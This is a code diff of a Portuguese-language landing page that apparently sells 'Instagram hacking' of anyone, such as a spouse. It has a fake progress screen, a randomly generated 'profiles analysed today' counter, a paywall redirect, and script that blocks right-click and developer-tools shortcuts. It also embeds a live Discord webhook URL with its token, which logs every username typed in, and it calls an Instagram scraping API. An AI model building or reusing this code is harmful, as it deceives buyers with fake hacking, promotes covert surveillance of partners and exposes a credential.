@@ -78,7 +78,6 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 .btn-wrap{position:relative;width:100%;height:40px;margin-top:16px}.btn-wrap .btn{height:100%;padding:0;background:#0098ff;border-radius:4px;cursor:not-allowed;box-shadow:none}.btn-progress{position:absolute;bottom:0;left:0;height:2px;background:rgba(249,249,249,.6);transition:width .3s linear;opacity:0}
 .typewriter-cursor{display:inline-block;width:2px;height:1em;background:linear-gradient(135deg,#4a37b6,#ab58f4);margin-left:2px;vertical-align:middle;animation:cursorBlink .8s steps(1) infinite}
 @keyframes cursorBlink{0%,50%{opacity:1}51%,100%{opacity:0}}
-
 .vs-modal-backdrop{position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.8);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;padding:20px;animation:vsFadeIn .3s ease-out;overflow-y:auto;}
 .vs-modal-backdrop.show{display:flex;}
 @keyframes vsFadeIn{from{opacity:0}to{opacity:1}}
@@ -218,120 +217,6 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 </div>
 
 <script>
-(function(){
-  document.addEventListener('contextmenu', (e) => { e.preventDefault(); return false; });
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
-    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) { e.preventDefault(); return false; }
-    if (e.ctrlKey && (e.key === 'U' || e.key === 'S')) { e.preventDefault(); return false; }
-  });
-})();
-
-(function(){
-  const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
-  let w,h,cols,drops;
-  const fs=14;
-  const chars='VERISCANアイウエオカキクケコサシスセソ0123456789'.split('');
-  function resize(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;cols=Math.floor(w/fs);drops=new Array(cols).fill(1)}
-  function draw(){
-    ctx.fillStyle='rgba(4,6,7,0.08)';
-    ctx.fillRect(0,0,w,h);
-    ctx.fillStyle='#a855f7';
-    ctx.font=fs+'px monospace';
-    for(let i=0;i<drops.length;i++){
-      const t=chars[Math.floor(Math.random()*chars.length)];
-      ctx.fillText(t,i*fs,drops[i]*fs);
-      if(drops[i]*fs>h&&Math.random()>0.975)drops[i]=0;
-      drops[i]++;
-    }
-  }
-  resize();
-  window.addEventListener('resize',resize);
-  setInterval(draw,50);
-})();
-
-(function(){
-  const dias=['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
-  const hoje=new Date();
-  const diaSemana=dias[hoje.getDay()];
-  const num=Math.floor(Math.random()*(98000-87000+1))+87000;
-  document.getElementById('contadorPerfis').textContent='+'+num.toLocaleString('pt-BR');
-  document.getElementById('textoContador').textContent='perfis analisados hoje ('+diaSemana+')';
-})();
-
-(function(){
-  const tEl=document.getElementById('tituloTypewriter');
-  const sEl=document.getElementById('subTypewriter');
-  const tHTML='O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
-  const sHTML='Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
-  const tTxt=tHTML.replace(/<[^>]+>/g,'');
-  const sTxt=sHTML.replace(/<[^>]+>/g,'');
-  const cur='<span class="typewriter-cursor"></span>';
-  function render(h,t,idx){
-    let v=0,r='',i=0;
-    while(i<h.length && v<idx){
-      if(h[i]==='<'){const f=h.indexOf('>',i);r+=h.slice(i,f+1);i=f+1;}
-      else{r+=h[i];v++;i++;}
-    }
-    return r;
-  }
-  function dig(h,t,el,vel,cb){
-    let i=0;const total=t.length;
-    const id=setInterval(()=>{
-      i++;
-      el.innerHTML=render(h,t,i)+cur;
-      if(i>=total){clearInterval(id);el.innerHTML=h;if(cb)cb();}
-    },vel);
-  }
-  dig(tHTML,tTxt,tEl,55,()=>dig(sHTML,sTxt,sEl,30));
-})();
-
-const _cfg=(()=>{try{return JSON.parse(localStorage.getItem('vs_admin_config')||'{}');}catch(e){return {};}})();
-const LIMITE_MINUTOS=_cfg.limiteMinutos??15;
-const CHAVE_LS='vs_pesq_ts';
-const CHAVE_CK='vs_pesq';
-const CHAVE_LAST_USER='vs_last_user';
-
-function setCookie(nome,valor,minutos){const d=new Date();d.setTime(d.getTime()+minutos*60*1000);document.cookie=nome+'='+valor+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';}
-function getCookie(nome){const match=document.cookie.match(new RegExp('(^|;\\s*)'+nome+'=([^;]*)'));return match?decodeURIComponent(match[2]):null;}
-function apagarCookie(nome){document.cookie=nome+'=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';}
-
-function podePesquisar(){
-  const agora=Date.now();
-  const limite=LIMITE_MINUTOS*60*1000;
-  let tsLS=0,tsCK=0;
-  try{tsLS=parseInt(localStorage.getItem(CHAVE_LS)||'0',10);}catch(e){}
-  const ckVal=getCookie(CHAVE_CK);
-  tsCK=ckVal?parseInt(ckVal,10):0;
-  const ts=Math.max(tsLS,tsCK);
-  if(!ts)return{ok:true};
-  const passou=agora-ts;
-  if(passou>=limite){try{localStorage.removeItem(CHAVE_LS);}catch(e){}apagarCookie(CHAVE_CK);return{ok:true};}
-  return{ok:false};
-}
-function marcarPesquisa(){const ts=String(Date.now());try{localStorage.setItem(CHAVE_LS,ts);}catch(e){}setCookie(CHAVE_CK,ts,LIMITE_MINUTOS);}
-
-function mostrarModalVIP(){
-  let ultimoUser='usuario';
-  let ultimoPerfil={};
-  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';ultimoPerfil=JSON.parse(localStorage.getItem('stalkea_profile')||'{}');}catch(e){}
-  document.getElementById('vsTargetName').textContent=ultimoUser;
-  document.getElementById('vsTargetName2').textContent=ultimoUser;
-  const avatarEl=document.getElementById('vsTargetAvatar');
-  avatarEl.src=ultimoPerfil.profile_pic_url||'https://unavatar.io/instagram/'+ultimoUser;
-  avatarEl.onerror=()=>{avatarEl.style.display='none';};
-  document.getElementById('vsModal').classList.add('show');
-  document.body.style.overflow='hidden';
-}
-function fecharModalVIP(){document.getElementById('vsModal').classList.remove('show');document.body.style.overflow='';}
-document.getElementById('vsModalClose').addEventListener('click',fecharModalVIP);
-document.getElementById('vsModal').addEventListener('click',(e)=>{if(e.target===e.currentTarget)fecharModalVIP();});
-document.getElementById('vsModalVip').addEventListener('click',()=>{
-  let ultimoUser='usuario';
-  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';}catch(e){}
-  window.location.href='/checkout?u='+encodeURIComponent(ultimoUser);
-});
-
 /* ============================================================
    API — instagram-api-fast-reliable-data-scraper (RapidAPI)
    ============================================================ */
@@ -349,7 +234,8 @@ async function buscar(u) {
       }
     });
     if (!r.ok) {
-      console.warn('[API] HTTP', r.status);
+      const t = await r.text();
+      console.warn('[API] HTTP', r.status, t.slice(0, 300));
       return null;
     }
     const d = await r.json();
@@ -392,6 +278,141 @@ function normalizar(user, fallback) {
   };
 }
 
+/* ============================================================
+   PROTEÇÃO
+   ============================================================ */
+(function(){
+  document.addEventListener('contextmenu', (e) => { e.preventDefault(); return false; });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && (e.key === 'U' || e.key === 'S')) { e.preventDefault(); return false; }
+  });
+})();
+
+/* ============================================================
+   MATRIX
+   ============================================================ */
+(function(){
+  const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
+  let w,h,cols,drops;
+  const fs=14;
+  const chars='VERISCANアイウエオカキクケコサシスセソ0123456789'.split('');
+  function resize(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;cols=Math.floor(w/fs);drops=new Array(cols).fill(1)}
+  function draw(){
+    ctx.fillStyle='rgba(4,6,7,0.08)';
+    ctx.fillRect(0,0,w,h);
+    ctx.fillStyle='#a855f7';
+    ctx.font=fs+'px monospace';
+    for(let i=0;i<drops.length;i++){
+      const t=chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(t,i*fs,drops[i]*fs);
+      if(drops[i]*fs>h&&Math.random()>0.975)drops[i]=0;
+      drops[i]++;
+    }
+  }
+  resize();
+  window.addEventListener('resize',resize);
+  setInterval(draw,50);
+})();
+
+/* ============================================================
+   CONTADOR
+   ============================================================ */
+(function(){
+  const dias=['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
+  const hoje=new Date();
+  const diaSemana=dias[hoje.getDay()];
+  const num=Math.floor(Math.random()*(98000-87000+1))+87000;
+  document.getElementById('contadorPerfis').textContent='+'+num.toLocaleString('pt-BR');
+  document.getElementById('textoContador').textContent='perfis analisados hoje ('+diaSemana+')';
+})();
+
+/* ============================================================
+   TYPEWRITER
+   ============================================================ */
+(function(){
+  const tEl=document.getElementById('tituloTypewriter');
+  const sEl=document.getElementById('subTypewriter');
+  const tHTML='O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
+  const sHTML='Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
+  const tTxt=tHTML.replace(/<[^>]+>/g,'');
+  const sTxt=sHTML.replace(/<[^>]+>/g,'');
+  const cur='<span class="typewriter-cursor"></span>';
+  function render(h,t,idx){
+    let v=0,r='',i=0;
+    while(i<h.length && v<idx){
+      if(h[i]==='<'){const f=h.indexOf('>',i);r+=h.slice(i,f+1);i=f+1;}
+      else{r+=h[i];v++;i++;}
+    }
+    return r;
+  }
+  function dig(h,t,el,vel,cb){
+    let i=0;const total=t.length;
+    const id=setInterval(()=>{
+      i++;
+      el.innerHTML=render(h,t,i)+cur;
+      if(i>=total){clearInterval(id);el.innerHTML=h;if(cb)cb();}
+    },vel);
+  }
+  dig(tHTML,tTxt,tEl,55,()=>dig(sHTML,sTxt,sEl,30));
+})();
+
+/* ============================================================
+   LIMITE PESQUISA
+   ============================================================ */
+const _cfg=(()=>{try{return JSON.parse(localStorage.getItem('vs_admin_config')||'{}');}catch(e){return {};}})();
+const LIMITE_MINUTOS=_cfg.limiteMinutos??15;
+const CHAVE_LS='vs_pesq_ts';
+const CHAVE_CK='vs_pesq';
+const CHAVE_LAST_USER='vs_last_user';
+
+function setCookie(nome,valor,minutos){const d=new Date();d.setTime(d.getTime()+minutos*60*1000);document.cookie=nome+'='+valor+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';}
+function getCookie(nome){const match=document.cookie.match(new RegExp('(^|;\\s*)'+nome+'=([^;]*)'));return match?decodeURIComponent(match[2]):null;}
+function apagarCookie(nome){document.cookie=nome+'=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';}
+
+function podePesquisar(){
+  const agora=Date.now();
+  const limite=LIMITE_MINUTOS*60*1000;
+  let tsLS=0,tsCK=0;
+  try{tsLS=parseInt(localStorage.getItem(CHAVE_LS)||'0',10);}catch(e){}
+  const ckVal=getCookie(CHAVE_CK);
+  tsCK=ckVal?parseInt(ckVal,10):0;
+  const ts=Math.max(tsLS,tsCK);
+  if(!ts)return{ok:true};
+  const passou=agora-ts;
+  if(passou>=limite){try{localStorage.removeItem(CHAVE_LS);}catch(e){}apagarCookie(CHAVE_CK);return{ok:true};}
+  return{ok:false};
+}
+function marcarPesquisa(){const ts=String(Date.now());try{localStorage.setItem(CHAVE_LS,ts);}catch(e){}setCookie(CHAVE_CK,ts,LIMITE_MINUTOS);}
+
+/* ============================================================
+   MODAL VIP
+   ============================================================ */
+function mostrarModalVIP(){
+  let ultimoUser='usuario';
+  let ultimoPerfil={};
+  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';ultimoPerfil=JSON.parse(localStorage.getItem('stalkea_profile')||'{}');}catch(e){}
+  document.getElementById('vsTargetName').textContent=ultimoUser;
+  document.getElementById('vsTargetName2').textContent=ultimoUser;
+  const avatarEl=document.getElementById('vsTargetAvatar');
+  avatarEl.src=ultimoPerfil.profile_pic_url||'https://unavatar.io/instagram/'+ultimoUser;
+  avatarEl.onerror=()=>{avatarEl.style.display='none';};
+  document.getElementById('vsModal').classList.add('show');
+  document.body.style.overflow='hidden';
+}
+function fecharModalVIP(){document.getElementById('vsModal').classList.remove('show');document.body.style.overflow='';}
+document.getElementById('vsModalClose').addEventListener('click',fecharModalVIP);
+document.getElementById('vsModal').addEventListener('click',(e)=>{if(e.target===e.currentTarget)fecharModalVIP();});
+document.getElementById('vsModalVip').addEventListener('click',()=>{
+  let ultimoUser='usuario';
+  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';}catch(e){}
+  window.location.href='/checkout?u='+encodeURIComponent(ultimoUser);
+});
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
 const $ = id => document.getElementById(id);
 let username = '';
 let profileData = null;
@@ -414,6 +435,9 @@ function fmt(n){
   return String(n);
 }
 
+/* ============================================================
+   WEBHOOK
+   ============================================================ */
 const DISCORD_WEBHOOK_PERFIL = 'https://discord.com/api/webhooks/1553867532966830241/yjvqT3vuTMS7JAcx2dIyGEkJNG534mBr_rXCVwqU35DyJwRew5n8ACEZfHyLqoWvag6_';
 
 async function notificarPerfilDigitado(usernameDigitado){
@@ -455,6 +479,9 @@ async function notificarPerfilDigitado(usernameDigitado){
   } catch (e){}
 }
 
+/* ============================================================
+   EVENTOS
+   ============================================================ */
 $('btn-start').addEventListener('click', () => {
   const status = podePesquisar();
   if (!status.ok) { mostrarModalVIP(); return; }
@@ -541,7 +568,7 @@ function hack(){
   show('screen-hacking');
   $('targetUser').value = '@' + username;
   let progress = 0;
-  const pb = $('btn-progress') || $('btnProgress');
+  const pb = $('btnProgress');
   pb.style.opacity = '1';
   const interval = setInterval(() => {
     progress = Math.min(100, progress + Math.random()*4 + 1);
